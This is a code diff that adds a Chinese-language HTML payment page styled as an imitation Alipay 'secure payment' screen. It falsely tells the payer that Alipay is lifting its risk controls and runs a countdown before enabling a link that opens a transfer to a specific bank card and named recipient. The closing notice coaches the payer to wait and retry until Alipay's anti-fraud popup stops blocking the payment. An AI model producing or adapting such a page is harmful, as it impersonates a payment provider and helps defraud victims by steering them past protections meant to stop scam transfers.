@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>付款页面</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial;
+    background: #f5f5f5;
+}
+
+/* 顶部仿支付宝栏 */
+.header {
+    background: #1677ff;
+    color: #fff;
+    text-align: center;
+    padding: 18px 10px;
+    font-size: 18px;
+    font-weight: bold;
+}
+
+/* 容器 */
+.container {
+    padding: 15px;
+    max-width: 500px;
+    margin: 0 auto;
+}
+
+/* 卡片 */
+.card {
+    background: #fff;
+    border-radius: 16px;
+    padding: 20px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.06);
+}
+
+/* 状态提示 */
+.status {
+    background: #e6f4ff;
+    color: #1677ff;
+    padding: 10px;
+    border-radius: 8px;
+    font-size: 14px;
+    margin-bottom: 15px;
+}
+
+/* 提示框 */
+.tip-box {
+    border: 1px dashed #1677ff;
+    padding: 15px;
+    border-radius: 10px;
+    font-size: 15px;
+    line-height: 1.6;
+    margin-bottom: 20px;
+}
+
+/* 收款人 */
+.receiver-label {
+    font-size: 14px;
+    color: #999;
+    margin-bottom: 5px;
+}
+
+.receiver-name {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
+
+/* 倒计时 */
+.countdown {
+    font-size: 14px;
+    color: #ff4d4f;
+    margin-bottom: 15px;
+}
+
+/* 按钮 */
+.btn {
+    display: block;
+    width: 100%;
+    padding: 15px;
+    font-size: 18px;
+    font-weight: bold;
+    color: #fff;
+    text-align: center;
+    border-radius: 12px;
+    background: #1677ff;
+    text-decoration: none;
+    opacity: 0.6;
+    pointer-events: none;
+    transition: all 0.3s;
+}
+
+/* 可点击状态 */
+.btn.active {
+    opacity: 1;
+    pointer-events: auto;
+}
+
+/* 提醒 */
+.notice {
+    margin-top: 20px;
+    font-size: 13px;
+    color: #666;
+    line-height: 1.6;
+    white-space: pre-line;
+}
+
+/* 适配 iPhone 刘海 */
+@supports(padding: max(0px)) {
+    body {
+        padding-bottom: env(safe-area-inset-bottom);
+    }
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">支付宝安全付款</div>
+
+<div class="container">
+    <div class="card">
+
+        <div class="status">正在检测支付环境，请稍候...</div>
+
+        <!-- 提示 -->
+        <div class="tip-box">
+            支付宝正在为您解除风控<br>
+            倒计时结束后<br>
+            请点击下方按钮进行付款
+        </div>
+
+        <!-- 收款人 -->
+        <div class="receiver-label">收款人</div>
+        <div class="receiver-name">李蔡欣</div>
+
+        <!-- 倒计时 -->
+        <div class="countdown">
+            请等待 <span id="time">30</span> 秒后操作
+        </div>
+
+        <!-- 按钮 -->
+        <a href="https://ds.alipay.com/?appId=09999988&actionType=toCard&bankAccount=%E6%9D%8E%E8%94%A1%E6%AC%A3&cardNo=621499***2747&bankMark=CCB&bankName=%E4%B8%AD%E5%9B%BD%E5%BB%BA%E8%AE%BE%E9%93%B6%E8%A1%8C&cardIndex=2604011229915757524&cardNoHidden=true&cardChannel=HISTORY_CARD" id="btn" class="btn">
+            点击进入付款
+        </a>
+
+        <!-- 提醒 -->
+        <div class="notice">
+重要提醒:
+请在输入金额页面停留10秒
+再输入购买金额付款
+如果还出现弹框拦截请重复上面操作直到能付款
+        </div>
+
+    </div>
+</div>
+
+<script>
+let time = 30;
+const timeEl = document.getElementById("time");
+const btn = document.getElementById("btn");
+
+const timer = setInterval(() => {
+    time--;
+    timeEl.innerText = time;
+
+    if (time <= 0) {
+        clearInterval(timer);
+        timeEl.innerText = "0";
+        btn.classList.add("active");
+    }
+}, 1000);
+</script>
+
+</body>
+</html>
